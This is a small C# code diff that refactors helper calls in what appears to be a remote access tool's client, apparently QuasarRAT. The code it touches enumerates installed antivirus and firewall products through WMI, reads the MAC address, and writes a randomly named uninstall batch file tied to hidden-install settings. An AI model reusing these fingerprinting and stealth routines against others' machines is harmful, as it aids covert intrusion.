@@ -13,8 +13,10 @@ using xClient.Config;
 using xClient.Core.Information;
 using xClient.Core.Encryption;
 using xClient.Core.Extensions;
+using xClient.Core.Helper;
 using xClient.Core.Networking;
-using UserStatus = xClient.Core.Commands.CommandHandler.UserStatus;
+using xClient.Enums;
+using xServer.Core.Helper;
 
 namespace xClient.Core
 {
@@ -187,7 +189,7 @@ namespace xClient.Core
             try
             {
                 string antivirusName = string.Empty;
-                string scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
+                string scope = (PlatformHelper.XpOrHigher) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                 string query = "SELECT * FROM AntivirusProduct";
 
                 using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
@@ -211,7 +213,7 @@ namespace xClient.Core
             try
             {
                 string firewallName = string.Empty;
-                string scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
+                string scope = (PlatformHelper.XpOrHigher) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                 string query = "SELECT * FROM FirewallProduct";
 
                 using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
@@ -288,7 +290,7 @@ namespace xClient.Core
                     }
 
                     if (foundCorrect)
-                        return Helper.Helper.FormatMacAddress(ni.GetPhysicalAddress().ToString());
+                        return FormatHelper.FormatMacAddress(ni.GetPhysicalAddress().ToString());
                 }
             }
 
@@ -540,7 +542,7 @@ namespace xClient.Core
 
                 string filename = Path.Combine(
                     Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    Helper.Helper.GetRandomFilename(12, ".bat"));
+                    FileHelper.GetRandomFilename(12, ".bat"));
 
                 string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                     ? "@echo off" + "\n" +
